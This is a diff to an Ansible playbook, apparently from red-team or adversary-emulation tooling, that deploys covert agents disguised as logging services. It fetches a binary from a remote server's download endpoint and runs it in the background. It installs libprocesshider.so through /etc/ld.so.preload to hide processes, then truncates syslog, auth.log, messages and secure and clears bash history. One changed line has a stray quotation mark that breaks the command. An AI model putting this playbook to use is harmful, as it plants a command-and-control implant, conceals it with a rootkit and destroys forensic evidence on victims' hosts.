@@ -44,38 +44,37 @@
 
     # Clean up existing agents if any (optional pre-clean)
     - name: kill process splunk
-      shell: "pkill -9 -f splunk || true"
+      shell: sudo pkill -9 -f splunk || true
       ignore_errors: yes
 
     - name: kill process syslog
-      shell: "pkill -9 -f syslog || true"
+      shell: sudo pkill -9 -f syslog || true
       ignore_errors: yes
 
     - name: kill process graylog
-      shell: pkill -9 -f graylog || true
+      shell: sudo pkill -9 -f graylog || true
       ignore_errors: yes
 
     - name: kill process notlog
-      shell: pkill -9 -f notlog || true
+      shell: sudo" pkill -9 -f notlog || true
       ignore_errors: yes
 
     - name: kill process ragdoll
-      shell: pkill -9 -f ragdoll || true
+      shell: sudo pkill -9 -f ragdoll || true
       ignore_errors: yes
 
     - name: Clean up any existing agents in /tmp or previous runs
-      file:
-        path: "{{ item }}"
-        state: absent
-      loop:
-        - "{{ deploy_dir }}/splunk*"
-        - "{{ deploy_dir }}/syslog*"
-        - "{{ deploy_dir }}/graylog*"
-        - "{{ deploy_dir }}/notlog*"
-        - "{{ deploy_dir }}/ragdoll*"
+      shell: |
+          sudo find /tmp -maxdepth 4 \( \
+          -name 'splunk*' -o \
+          -name 'syslog*' -o \
+          -name 'graylog*' -o \
+          -name 'notlog*' -o \
+          -name 'ragdoll*' \
+        \) -exec rm -rf {} + || true
 
     - name: Clean up previous kernel link
-      shell: "echo '' > /etc/ld.so.preload"
+      shell: "sudo echo '' > /etc/ld.so.preload"
       ignore_errors: yes
 
     - name: Delete previous created process.so
@@ -115,7 +114,7 @@
         contact="tcp"
         cd {{ deploy_dir }}
         for name in syslog-tcp; do
-          curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
+          sudo curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
           sudo chmod +x "$name"
           sudo nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
         done
@@ -139,28 +138,28 @@
         chdir: "{{ deploy_dir }}"
 
     - name: Move compiled .so and update /etc/ld.so.preload
-      shell: "mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/"
+      shell: sudo mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/
     
     - name: echo to preload
-      shell: "echo '/usr/local/lib/libprocesshider.so' >> /etc/ld.so.preload"
+      shell: sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
     
     # Log and history cleanup
     - block:
         - name: Truncate syslog (Debian/Ubuntu)
-          shell: "truncate -s 0 /var/log/syslog 2>/dev/null || true"
+          shell: truncate -s 0 /var/log/syslog 2>/dev/null || true
           when: ansible_facts['os_family'] == "Debian"
 
         - name: Truncate auth.log (Debian/Ubuntu)
-          shell: "truncate -s 0 /var/log/auth.log 2>/dev/null || true"
+          shell: truncate -s 0 /var/log/auth.log 2>/dev/null || true
           when: ansible_facts['os_family'] == "Debian"
 
         - name: Truncate messages (Rocky/RedHat)
-          shell: "truncate -s 0 /var/log/messages 2>/dev/null || true"
+          shell: truncate -s 0 /var/log/messages 2>/dev/null || true
           when: ansible_facts['os_family'] == "RedHat"
 
         - name: Truncate secure (Rocky/RedHat)
-          shell: "truncate -s 0 /var/log/secure 2>/dev/null || true"
+          shell: truncate -s 0 /var/log/secure 2>/dev/null || true
           when: ansible_facts['os_family'] == "RedHat"
 
         - name: Clear root bash history
